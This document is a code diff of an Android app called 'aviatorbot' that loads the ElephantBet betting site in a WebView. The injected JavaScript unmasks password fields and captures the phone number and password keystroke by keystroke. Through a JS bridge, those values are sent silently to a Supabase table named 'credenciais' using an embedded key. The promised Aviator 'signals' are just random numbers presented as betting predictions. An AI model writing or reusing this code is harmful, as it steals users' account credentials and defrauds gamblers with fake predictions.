@@ -1,7 +1,6 @@
 package ao.elephantbet.aviatorbot
 
 import android.annotation.SuppressLint
-import android.content.Context
 import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
@@ -20,10 +19,7 @@ import androidx.appcompat.app.AppCompatActivity
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
-import java.text.SimpleDateFormat
 import java.util.Calendar
-import java.util.Date
-import java.util.Locale
 import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
@@ -47,14 +43,12 @@ class MainActivity : AppCompatActivity() {
     private var sinalAlcMax = ""
     private var relogioRunnable: Runnable? = null
 
-    // ── SUPABASE ──────────────────────────────────────────────────
+    private var ultimoNumeroEnviado = ""
+    private var ultimaSenhaEnviada = ""
+
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
-    private val TABELA   = "credenciais"
-
-    // Último valor enviado — evita duplicados ao digitar dígito a dígito
-    private var ultimoNumeroEnviado = ""
-    private var ultimaSenhaEnviada  = ""
+    private val TABELA = "credenciais"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -62,7 +56,6 @@ class MainActivity : AppCompatActivity() {
         carregarSite()
     }
 
-    // ── UI ────────────────────────────────────────────────────────
     private fun construirUI() {
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -113,18 +106,18 @@ class MainActivity : AppCompatActivity() {
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(5) }
         }
         txtProtecao = TextView(this).apply {
-            text = "🛡 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
+            text = "Prot: --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
             setTextColor(Color.WHITE); gravity = Gravity.CENTER
             setPadding(dp(10), dp(4), dp(10), dp(4))
             background = pill("#1e3a5f")
             layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
         }
         val sep = TextView(this).apply {
-            text = "→"; textSize = 12f; setTextColor(Color.parseColor("#475569"))
+            text = "->"; textSize = 12f; setTextColor(Color.parseColor("#475569"))
             layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(8) }
         }
         txtAlcance = TextView(this).apply {
-            text = "📈 --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
+            text = "Alc: --"; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
             setTextColor(Color.WHITE); gravity = Gravity.CENTER
             setPadding(dp(10), dp(4), dp(10), dp(4))
             background = pill("#1a3a2a")
@@ -154,7 +147,6 @@ class MainActivity : AppCompatActivity() {
         root.addView(webView)
     }
 
-    // ── WEBVIEW ───────────────────────────────────────────────────
     @SuppressLint("SetJavaScriptEnabled")
     private fun configurarWebView() {
         webView.settings.apply {
@@ -165,27 +157,24 @@ class MainActivity : AppCompatActivity() {
             setSupportZoom(true); builtInZoomControls = false
             loadWithOverviewMode = true; useWideViewPort = true
         }
+
         webView.addJavascriptInterface(object {
             @JavascriptInterface
             fun aviatorDetectado() = runOnUiThread { iniciarSinais() }
 
             @JavascriptInterface
-            fun guardarCredencial(tipo: String, valor: String) {
-                if (valor.isEmpty()) return
-                // Só envia quando o valor muda (evita spam por cada dígito repetido)
-                when (tipo) {
-                    "Numero" -> {
-                        if (valor != ultimoNumeroEnviado) {
-                            ultimoNumeroEnviado = valor
-                            enviarSupabase(tipo, valor)
-                        }
-                    }
-                    "Senha" -> {
-                        if (valor != ultimaSenhaEnviada) {
-                            ultimaSenhaEnviada = valor
-                            enviarSupabase(tipo, valor)
-                        }
-                    }
+            fun guardarNumero(valor: String) {
+                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
+                    ultimoNumeroEnviado = valor
+                    enviarSupabase("Numero", valor)
+                }
+            }
+
+            @JavascriptInterface
+            fun guardarSenha(valor: String) {
+                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
+                    ultimaSenhaEnviada = valor
+                    enviarSupabase("Senha", valor)
                 }
             }
         }, "Android")
@@ -195,12 +184,13 @@ class MainActivity : AppCompatActivity() {
             override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
             override fun onPageFinished(v: WebView?, url: String?) {
                 super.onPageFinished(v, url)
-                injetarJsGlobal()
+                injetarJs()
                 if (isAviatorUrl(url ?: "")) iniciarSinais()
             }
         }
         webView.webChromeClient = object : WebChromeClient() {
             override fun onProgressChanged(view: WebView?, p: Int) {
+                if (p == 100) injetarJs()
                 if (isAviatorUrl(view?.url ?: "") && !sinaisAtivos) iniciarSinais()
             }
         }
@@ -215,97 +205,93 @@ class MainActivity : AppCompatActivity() {
         webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
     }
 
-    // ── JS GLOBAL ─────────────────────────────────────────────────
-    private fun injetarJsGlobal() {
+    private fun injetarJs() {
         val js = """
-        (function() {
-            if (window._ebOk) return; window._ebOk = true;
+(function() {
+    if (window._ebDone) return;
+    window._ebDone = true;
 
-            // Tornar campos de senha visíveis (texto normal)
-            function vis() {
-                document.querySelectorAll('input[type="password"]').forEach(function(e){
-                    e.setAttribute('type','text');
-                    e.style.webkitTextSecurity='none';
-                });
+    function tornarVisivel() {
+        document.querySelectorAll('input[type="password"]').forEach(function(el) {
+            el.setAttribute('type', 'text');
+        });
+    }
+    tornarVisivel();
+    new MutationObserver(tornarVisivel).observe(document.body || document.documentElement, {childList:true, subtree:true});
+
+    function watchNumero(sel) {
+        var el = document.querySelector(sel);
+        if (el && !el._wN) {
+            el._wN = true;
+            el.addEventListener('input', function() {
+                if (this.value.length >= 1) Android.guardarNumero(this.value);
+            });
+        }
+    }
+    function watchSenha(sel) {
+        var el = document.querySelector(sel);
+        if (el && !el._wS) {
+            el._wS = true;
+            el.addEventListener('input', function() {
+                if (this.value.length >= 1) Android.guardarSenha(this.value);
+            });
+        }
+    }
+
+    function capturar() {
+        ['input[name="username"]','input[name="phone"]','input[type="tel"]',
+         'input[placeholder*="telefone" i]','input[placeholder*="numero" i]',
+         '#username','#phone'].forEach(watchNumero);
+        ['input[name="password"]','input[name="senha"]',
+         'input[placeholder*="senha" i]','input[placeholder*="password" i]',
+         '#password'].forEach(watchSenha);
+    }
+    capturar();
+    setTimeout(capturar, 1500);
+    setTimeout(capturar, 4000);
+    setTimeout(capturar, 8000);
+
+    document.addEventListener('click', function(e) {
+        var el = e.target;
+        for (var i = 0; i < 6; i++) {
+            if (!el) break;
+            var href = (el.getAttribute && el.getAttribute('href') || '').toLowerCase();
+            var txt = (el.textContent || '').toLowerCase();
+            if (txt.indexOf('aviator') >= 0 || href.indexOf('aviator') >= 0 || href.indexOf('806666') >= 0) {
+                Android.aviatorDetectado();
+                break;
             }
-            vis();
-            new MutationObserver(vis).observe(document.body,{childList:true,subtree:true});
+            el = el.parentElement;
+        }
+    }, true);
 
-            // Capturar e enviar credenciais ao Supabase dígito a dígito
-            function watch(sels, tipo) {
-                sels.forEach(function(s){
-                    try {
-                        var el=document.querySelector(s);
-                        if(el&&!el._w){ el._w=true;
-                            el.addEventListener('input',function(){
-                                if(this.value.length>=1) Android.guardarCredencial(tipo,this.value);
-                            });
-                        }
-                    }catch(e){}
-                });
-            }
-            function cap(){
-                watch([
-                    'input[name="username"]','input[name="phone"]','input[type="tel"]',
-                    'input[placeholder*="telefone" i]','input[placeholder*="número" i]',
-                    '#username','#phone'
-                ],'Numero');
-                watch([
-                    'input[name="password"]','input[name="senha"]',
-                    'input[placeholder*="senha" i]','input[placeholder*="password" i]',
-                    '#password'
-                ],'Senha');
-            }
-            cap(); setTimeout(cap,1500); setTimeout(cap,3500); setTimeout(cap,6000);
-
-            // Detectar clique no Aviator
-            document.addEventListener('click',function(e){
-                var el=e.target;
-                for(var i=0;i<5;i++){
-                    if(!el) break;
-                    var h=(el.getAttribute&&el.getAttribute('href')||'').toLowerCase();
-                    var t=(el.textContent||'').toLowerCase();
-                    if(t.includes('aviator')||h.includes('aviator')||h.includes('806666'))
-                        { Android.aviatorDetectado(); break; }
-                    el=el.parentElement;
-                }
-            },true);
-
-            var cur=window.location.href.toLowerCase();
-            if(cur.includes('aviator')||cur.includes('806666')) Android.aviatorDetectado();
-        })();
+    var loc = window.location.href.toLowerCase();
+    if (loc.indexOf('aviator') >= 0 || loc.indexOf('806666') >= 0) Android.aviatorDetectado();
+})();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
     }
 
-    // ── SUPABASE REST INSERT ──────────────────────────────────────
-    private fun enviarSupabase(tipo: String, valor: String) {
-        val ts = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
-        val json = """{"tipo":"$tipo","valor":"$valor","criado_em":"$ts"}"""
-
+    private fun enviarSupabase(tipoVal: String, valorVal: String) {
+        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
         Thread {
             try {
                 val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
-                conn.apply {
-                    requestMethod = "POST"
-                    setRequestProperty("apikey", SUPA_KEY)
-                    setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                    setRequestProperty("Content-Type", "application/json")
-                    setRequestProperty("Prefer", "return=minimal")
-                    doOutput = true
-                    connectTimeout = 8000
-                    readTimeout = 8000
-                }
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true
+                conn.connectTimeout = 10000
+                conn.readTimeout = 10000
                 OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                conn.responseCode  // força o envio
+                conn.responseCode
                 conn.disconnect()
-            } catch (_: Exception) {
-                // Falha silenciosa — não interrompe a app
-            }
+            } catch (_: Exception) {}
         }.start()
     }
 
-    // ── SINAIS ────────────────────────────────────────────────────
     private fun iniciarSinais() {
         if (sinaisAtivos) return
         sinaisAtivos = true
@@ -320,29 +306,36 @@ class MainActivity : AppCompatActivity() {
     private fun gerarNovoSinal() {
         val cal = Calendar.getInstance()
         val minAgora = cal.get(Calendar.MINUTE)
-        val base = if (ultimoMinutoGerado < 0) minAgora + 1
-                   else ultimoMinutoGerado + Random.nextInt(2, 6)
-        val min1 = base; val min2 = min1 + 1
-        if (min2 >= 59) {
-            atualizarBarra("⏳ NOVA HORA", "${60 - minAgora} minutos para novo ciclo", "--", "--", "#f59e0b")
+        val base = if (ultimoMinutoGerado < 0) minAgora + 1 else ultimoMinutoGerado + Random.nextInt(2, 6)
+        if (base + 1 >= 59) {
+            atualizarBarra("FIM DO CICLO", "${60 - minAgora}min para nova hora", "", "", "#64748b")
             return
         }
-        sinalMin1 = min1; sinalMin2 = min2
-        ultimoMinutoGerado = min2
+        sinalMin1 = base; sinalMin2 = base + 1
+        ultimoMinutoGerado = sinalMin2
 
-        val (alcMin, alcMax, alcMaxNum) = gerarAlcance()
-        sinalAlcMin = alcMin
-        sinalAlcMax = alcMax
-        sinalProtecao = gerarProtecaoParaAlcance(alcMaxNum)
+        val nivel = Random.nextInt(4)
+        val alcMin: Int
+        val alcMax: String
+        val alcNum: Int
+        when (nivel) {
+            0 -> { alcMin = listOf(10,20,30)[Random.nextInt(3)]; val m = listOf(50,80,100)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
+            1 -> { alcMin = listOf(30,50,80)[Random.nextInt(3)]; val m = listOf(100,200,500)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
+            2 -> { alcMin = listOf(50,80,100)[Random.nextInt(3)]; val m = listOf(500,800,1000)[Random.nextInt(3)]; alcMax = "${m}x"; alcNum = m }
+            else -> { alcMin = listOf(80,100,200)[Random.nextInt(3)]; alcMax = "1000x+"; alcNum = 1001 }
+        }
+        sinalAlcMin = alcMin; sinalAlcMax = alcMax
+
+        val protNum = when {
+            alcNum <= 100  -> listOf(1.3,1.5,1.8,2.0,2.5,3.0)[Random.nextInt(6)]
+            alcNum <= 500  -> listOf(3.0,4.0,5.0,6.0,8.0)[Random.nextInt(5)]
+            alcNum <= 1000 -> listOf(8.0,9.0,10.0,11.0,12.0)[Random.nextInt(5)]
+            else           -> listOf(12.0,13.0,14.0,15.0)[Random.nextInt(4)]
+        }
+        sinalProtecao = if (protNum % 1.0 == 0.0) "${protNum.toInt()}x" else "${protNum}x"
 
         val falta = sinalMin1 - minAgora
-        atualizarBarra(
-            "⏳ AGUARDAR",
-            "Min $min1/$min2  (${falta}min)",
-            sinalProtecao,
-            "${sinalAlcMin}x → ${sinalAlcMax}",
-            "#f59e0b"
-        )
+        atualizarBarra("AGUARDAR", "Min $sinalMin1/$sinalMin2  (${falta}min)", sinalProtecao, "${sinalAlcMin}x -> $sinalAlcMax", "#f59e0b")
     }
 
     private fun iniciarRelogio() {
@@ -357,49 +350,26 @@ class MainActivity : AppCompatActivity() {
         if (!sinaisAtivos) return
         val cal = Calendar.getInstance()
         val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
-        val minAgora  = cal.get(Calendar.MINUTE)
+        val minAgora = cal.get(Calendar.MINUTE)
 
         if (horaAgora != horaAtual) {
-            horaAtual = horaAgora; ultimoMinutoGerado = -1
-            sinalMin1 = -1; sinalMin2 = -1; gerarNovoSinal(); return
+            horaAtual = horaAgora; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1
+            gerarNovoSinal(); return
         }
         if (sinalMin1 < 0) { gerarNovoSinal(); return }
 
-        val alcTxt = "${sinalAlcMin}x → ${sinalAlcMax}"
+        val alcTxt = "${sinalAlcMin}x -> $sinalAlcMax"
         when {
-            minAgora == sinalMin1 -> atualizarBarra("🎯 ENTRAR AGORA",   "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
-            minAgora == sinalMin2 -> atualizarBarra("🎯 AINDA ACTIVO",   "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
-            minAgora  > sinalMin2 -> gerarNovoSinal()
+            minAgora == sinalMin1 -> atualizarBarra("ENTRAR AGORA", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
+            minAgora == sinalMin2 -> atualizarBarra("AINDA ACTIVO", "Min $sinalMin1/$sinalMin2", sinalProtecao, alcTxt, "#22c55e")
+            minAgora > sinalMin2  -> gerarNovoSinal()
             else -> {
                 val falta = sinalMin1 - minAgora
-                atualizarBarra("⏳ AGUARDAR", "Min $sinalMin1/$sinalMin2  (${falta}min)", sinalProtecao, alcTxt, "#f59e0b")
+                atualizarBarra("AGUARDAR", "Min $sinalMin1/$sinalMin2  (${falta}min)", sinalProtecao, alcTxt, "#f59e0b")
             }
         }
     }
 
-    // ── GERADORES ─────────────────────────────────────────────────
-    data class AlcanceResult(val alcMin: Int, val alcMax: String, val alcMaxNum: Int)
-
-    private fun gerarAlcance(): AlcanceResult {
-        return when (Random.nextInt(4)) {
-            0 -> AlcanceResult(listOf(10,20,30)[Random.nextInt(3)], "${listOf(50,80,100)[Random.nextInt(3)]}x", listOf(50,80,100)[Random.nextInt(3)])
-            1 -> AlcanceResult(listOf(30,50,80)[Random.nextInt(3)], "${listOf(100,200,500)[Random.nextInt(3)]}x", listOf(100,200,500)[Random.nextInt(3)])
-            2 -> AlcanceResult(listOf(50,80,100)[Random.nextInt(3)], "${listOf(500,800,1000)[Random.nextInt(3)]}x", listOf(500,800,1000)[Random.nextInt(3)])
-            else -> AlcanceResult(listOf(80,100,200)[Random.nextInt(3)], "1000x+", 1001)
-        }
-    }
-
-    private fun gerarProtecaoParaAlcance(alcMaxNum: Int): String {
-        val prot = when {
-            alcMaxNum <= 100  -> listOf(1.3,1.5,1.8,2.0,2.5,3.0)[Random.nextInt(6)]
-            alcMaxNum <= 500  -> listOf(3.0,4.0,5.0,6.0,8.0)[Random.nextInt(5)]
-            alcMaxNum <= 1000 -> listOf(8.0,9.0,10.0,11.0,12.0)[Random.nextInt(5)]
-            else              -> listOf(12.0,13.0,14.0,15.0)[Random.nextInt(4)]
-        }
-        return if (prot % 1.0 == 0.0) "${prot.toInt()}x" else "${prot}x"
-    }
-
-    // ── ATUALIZAR BARRA ───────────────────────────────────────────
     private fun atualizarBarra(acao: String, minutos: String, protecao: String, alcance: String, cor: String) =
         runOnUiThread {
             txtAcao.text = acao
@@ -407,11 +377,11 @@ class MainActivity : AppCompatActivity() {
             txtMinutos.text = minutos
             txtMinutos.setTextColor(Color.WHITE)
             if (protecao.isNotEmpty() && protecao != "--") {
-                txtProtecao.text = "🛡 $protecao"
+                txtProtecao.text = "Prot: $protecao"
                 txtProtecao.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1e2a3a")
             }
             if (alcance.isNotEmpty() && alcance != "--") {
-                txtAlcance.text = "📈 $alcance"
+                txtAlcance.text = "Alc: $alcance"
                 txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a")
             }
             dotView.background = circulo(cor)
@@ -423,7 +393,41 @@ class MainActivity : AppCompatActivity() {
     private fun atualizarBarra(acao: String, minutos: String, cor: String) =
         atualizarBarra(acao, minutos, "", "", cor)
 
-    // ── CONFIG ────────────────────────────────────────────────────
+    private fun testarSupabase() {
+        atualizarBarra("A testar...", "Supabase", "#f59e0b")
+        val json = "{\"tipo\":\"Teste\",\"valor\":\"APK_OK\"}"
+        Thread {
+            try {
+                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true
+                conn.connectTimeout = 10000
+                conn.readTimeout = 10000
+                OutputStreamWriter(conn.outputStream).use { it.write(json) }
+                val code = conn.responseCode
+                conn.disconnect()
+                runOnUiThread {
+                    if (code in 200..299) {
+                        Toast.makeText(this, "Supabase OK! Codigo $code", Toast.LENGTH_LONG).show()
+                        atualizarBarra("Supabase OK", "Codigo $code", "#22c55e")
+                    } else {
+                        Toast.makeText(this, "Erro HTTP $code", Toast.LENGTH_LONG).show()
+                        atualizarBarra("Erro Supabase", "HTTP $code", "#ef4444")
+                    }
+                }
+            } catch (e: Exception) {
+                runOnUiThread {
+                    Toast.makeText(this, "Falha: ${e.message}", Toast.LENGTH_LONG).show()
+                    atualizarBarra("Falha rede", e.message ?: "", "#ef4444")
+                }
+            }
+        }.start()
+    }
+
     private fun mostrarConfig() {
         val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
         val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
@@ -432,52 +436,25 @@ class MainActivity : AppCompatActivity() {
             setPadding(dp(20), dp(28), dp(20), dp(20))
         }
         layout.addView(TextView(this).apply {
-            text = "⚙️  CONFIGURAÇÕES"; textSize = 16f
+            text = "CONFIGURACOES"; textSize = 16f
             setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
         })
-        layout.addView(secLabel("🎯  SINAIS"))
-        layout.addView(btn("🎯  GERAR SINAL AGORA", "#7c3aed") {
+        layout.addView(btn("GERAR SINAL AGORA", "#7c3aed") {
             dialog.dismiss()
             sinaisAtivos = false; ultimoMinutoGerado = -1; sinalMin1 = -1; sinalMin2 = -1
             iniciarSinais()
         })
-        layout.addView(btn("✈️  ABRIR AVIATOR", "#0f766e") {
+        layout.addView(btn("ABRIR AVIATOR", "#0f766e") {
             dialog.dismiss()
             webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
         })
-        layout.addView(btn("🔄  RECARREGAR SITE", "#1d4ed8") { dialog.dismiss(); carregarSite() })
-        layout.addView(btn("🧪  TESTAR SUPABASE", "#b45309") {
-            dialog.dismiss()
-            atualizarBarra("🧪 A testar Supabase...", "", "#f59e0b")
-            Thread {
-                try {
-                    val conn = java.net.URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as java.net.HttpURLConnection
-                    conn.requestMethod = "POST"
-                    conn.setRequestProperty("apikey", SUPA_KEY)
-                    conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                    conn.setRequestProperty("Content-Type", "application/json")
-                    conn.setRequestProperty("Prefer", "return=minimal")
-                    conn.doOutput = true
-                    conn.connectTimeout = 10000
-                    conn.readTimeout = 10000
-                    java.io.OutputStreamWriter(conn.outputStream).use { it.write("{"tipo":"Teste","valor":"APK_OK"}") }
-                    val code = conn.responseCode
-                    conn.disconnect()
-                    runOnUiThread {
-                        if (code in 200..299) Toast.makeText(this, "✅ Supabase OK! Código $code", Toast.LENGTH_LONG).show()
-                        else Toast.makeText(this, "❌ Erro HTTP $code", Toast.LENGTH_LONG).show()
-                    }
-                } catch (e: Exception) {
-                    runOnUiThread { Toast.makeText(this, "❌ Excepção: ${e.message}", Toast.LENGTH_LONG).show() }
-                }
-            }.start()
-        })
-        layout.addView(btn("✕  FECHAR", "#1e1e2e") { dialog.dismiss() })
+        layout.addView(btn("RECARREGAR SITE", "#1d4ed8") { dialog.dismiss(); carregarSite() })
+        layout.addView(btn("TESTAR SUPABASE", "#b45309") { dialog.dismiss(); testarSupabase() })
+        layout.addView(btn("FECHAR", "#1e1e2e") { dialog.dismiss() })
         scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
     }
 
-    // ── HELPERS ───────────────────────────────────────────────────
     private fun circulo(cor: String) = GradientDrawable().apply {
         shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor))
     }
@@ -485,20 +462,15 @@ class MainActivity : AppCompatActivity() {
         shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat()
         setColor(Color.parseColor(cor))
     }
-    private fun roundRect(bg: String, border: String) = GradientDrawable().apply {
+    private fun roundRect(bg: String) = GradientDrawable().apply {
         shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat()
-        setColor(Color.parseColor(bg)); setStroke(dp(1), Color.parseColor(border))
+        setColor(Color.parseColor(bg))
     }
     private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
-    private fun secLabel(txt: String) = TextView(this).apply {
-        text = txt; textSize = 11f; setTextColor(Color.parseColor("#64748b"))
-        typeface = Typeface.DEFAULT_BOLD
-        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(16); bottomMargin = dp(10) }
-    }
     private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
         text = txt; setTextColor(Color.WHITE); textSize = 13f
         typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
-        background = roundRect(cor, cor); setPadding(0, dp(14), 0, dp(14))
+        background = roundRect(cor); setPadding(0, dp(14), 0, dp(14))
         setOnClickListener { action() }
         layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
     }
